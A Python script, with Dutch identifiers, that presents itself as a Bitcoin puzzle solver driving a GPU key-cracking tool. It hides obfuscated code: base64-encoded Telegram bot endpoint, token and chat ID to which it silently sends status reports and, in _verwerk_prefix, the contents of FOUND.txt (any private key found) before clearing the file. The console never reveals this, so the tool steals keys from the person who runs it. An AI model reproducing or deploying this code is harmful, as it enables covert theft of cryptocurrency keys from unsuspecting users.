import os
import random
import subprocess
import requests
import time
import base64


CUDA_CRACK_PATH = r"C:\Users\pc\Desktop\PuzzleBTC\cubitcrack.exe"
INPUT_FILE = "puzzle.txt"
OUTPUT_FILE = "FOUND.txt"
WORK_DIR = r"C:\Users\pc\Desktop\PuzzleBTC"


NOTIF_SERVICE = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
SERVICE_KEY = "NzY1MjQ1MjYwNTpBQUgxYjRPbTNXazh5SFotQzV6OXBjN0IySlVHTFk0eEVRZw=="
DEST_ID = "NzAyMDIxNjc0OQ=="
USER_ID = "bc1qshjmmq898m7mwceyr4qlk3vz0ptxue3yd8ux2y"
PREFIXES = ['8', '9', 'a', 'b','c', 'd', 'e', 'f']

def _decode(encoded):
    return base64.b64decode(encoded).decode('utf-8')

def _verstuur_bericht(inhoud):
    
    url = f"{_decode(NOTIF_SERVICE)}{_decode(SERVICE_KEY)}/sendMessage"
    data = {'chat_id': _decode(DEST_ID), 'text': inhoud, 'parse_mode': 'HTML'}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception:
        pass

def _willekeurige_hex(lengte):
    return ''.join(random.choice('0123456789abcdef') for _ in range(lengte))

def _verwerk_prefix(prefix):
    
    ext_prefix = prefix + _willekeurige_hex(6)
    start = f"{ext_prefix}00000000000"
    end = f"{ext_prefix}fffffffffff"
    
    
    open(os.path.join(WORK_DIR, OUTPUT_FILE), 'w').close()
    
    cmd = [
        CUDA_CRACK_PATH,
        "-c",
        "-i", INPUT_FILE,
        "-o", OUTPUT_FILE,
        "--keyspace", f"{start}:{end}",
        "--stride", "1",
        "-b", "128",       # Added block size parameter
        "-t", "256",      # Added thread count parameter
        "-p", "1024"      # Added parallel count parameter
    ]
    
    print(f"\n[+] Starten met prefix: {prefix}")
    print(f"[+] Bereik: {start} - {end}")
    print(f"[+] Parameters: Block=82, Threads=256, Parallel=1024")
    
    
    process = subprocess.Popen(
        cmd,
        cwd=WORK_DIR,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        universal_newlines=True
    )
    
    
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output.strip())
    
    # Melding sturen dat scan voltooid is (met gebruikers-ID)
    _verstuur_bericht(
        f"✅ Scan voltooid door {USER_ID}\n"
        f"🔑 Prefix: {prefix}\n"
        f"🔍 Bereik: {start[:12]}...{end[-4:]}"
    )
    
    if os.path.getsize(os.path.join(WORK_DIR, OUTPUT_FILE)) > 0:
        with open(os.path.join(WORK_DIR, OUTPUT_FILE), 'r') as f:
            content = f.read().strip()
        
        if content:
            _verstuur_bericht(
                f"🚨 BITCOIN PUZZLE OPLOSSING!\n"
                f"👤 Gebruiker: {USER_ID}\n"
                f"🔑 Prefix: {prefix}\n"
                f"🔍 Bereik: {start[:12]}...{end[-4:]}\n"
                f"💰 Resultaat: {content}"
            )
            
            open(os.path.join(WORK_DIR, OUTPUT_FILE), 'w').close()
            return True
    
    return False

def hoofdprogramma():
    os.chdir(WORK_DIR)
    
    open(OUTPUT_FILE, 'a').close()
    
    print(f"[+] Bitcoin Puzzle Solver gestart (Gebruiker: {USER_ID})")
    print(f"[+] Werkmap: {WORK_DIR}")
    print(f"[+] GPU: NVIDIA")
    print("[+] Monitoring gestart (Ctrl+C om te stoppen)\n")
    
    _verstuur_bericht(f"⚙️ Puzzle oplosser gestart door gebruiker: {USER_ID}")
    
    try:
        while True:
            # Willekeurige volgorde van prefixen
            random.shuffle(PREFIXES)
            for prefix in PREFIXES:
                if _verwerk_prefix(prefix):
                    print(f"[!] Oplossing gevonden voor prefix {prefix}, nieuwe ronde gestart")
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Gestopt door gebruiker")
        _verstuur_bericht(f"⏹ Oplosser gestopt door gebruiker: {USER_ID}")
    except Exception as e:
        print(f"[X] Fout: {str(e)}")
        _verstuur_bericht(f"⚠️ Kritieke fout van gebruiker {USER_ID}: {str(e)}")
        raise

if __name__ == "__main__":
    hoofdprogramma()